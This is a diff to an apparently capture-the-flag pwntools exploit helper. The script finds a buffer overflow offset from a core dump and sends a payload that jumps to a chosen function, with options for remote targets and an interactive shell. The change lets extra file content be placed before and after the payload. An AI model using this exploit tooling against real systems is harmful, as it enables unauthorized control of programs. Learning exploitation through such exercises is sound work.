@@ -45,6 +45,8 @@ if __name__ == "__main__":
     parser.add_argument('-g', action="store_true", dest="gdbDebug", required=False, help="Attach GDB")
     parser.add_argument('-f', action="store", dest="file", required=True, help="File to PWN")
     parser.add_argument('-t', action="store", dest="target", required=True, help="Target Function")
+    parser.add_argument('--after', action="store", dest="after", required=False, help="Add file content after payload")
+    parser.add_argument('--before', action="store", dest="before", required=False, help="Add file content before payload")
     parser.add_argument('--offset', action="store_true", dest="offset", required=False, help="Print offset Instruction Pointer")
     parser.add_argument('--shell', action="store_true", dest="shell", required=False, help="Stay interactive")
     parser.add_argument('--remote', action="store_true", dest="remote", required=False, help="Exploit remote server")
@@ -58,6 +60,20 @@ if __name__ == "__main__":
     assert target in elf.symbols
     target = elf.symbols.get(target) # Get address of target function
 
+    if results.after is not None:
+        with open(results.after,"rb") as f:
+            after=f.read()
+            f.close()
+    else:
+        after=b'' 
+
+    if results.before is not None:
+        with open(results.before,"rb") as f:
+            before=f.read()
+            f.close()
+    else:
+        before=b''
+
     # Verbosity
     if (results.verbose):
         context.log_level = "info"
@@ -68,7 +84,7 @@ if __name__ == "__main__":
     payload = cyclic(1000)
 
     io = process(file)
-    io.sendline(payload)
+    io.sendline(before+payload+after)
     io.wait()
 
     # Get core dump and analyse it to get the offset of the instruction pointer
@@ -108,7 +124,7 @@ if __name__ == "__main__":
         gdb.attach(io)
 
     # Send payload
-    io.send(payload)
+    io.send(before+payload+after)
     io.sendline(b"\n")
 
     # Get the flag or a shell
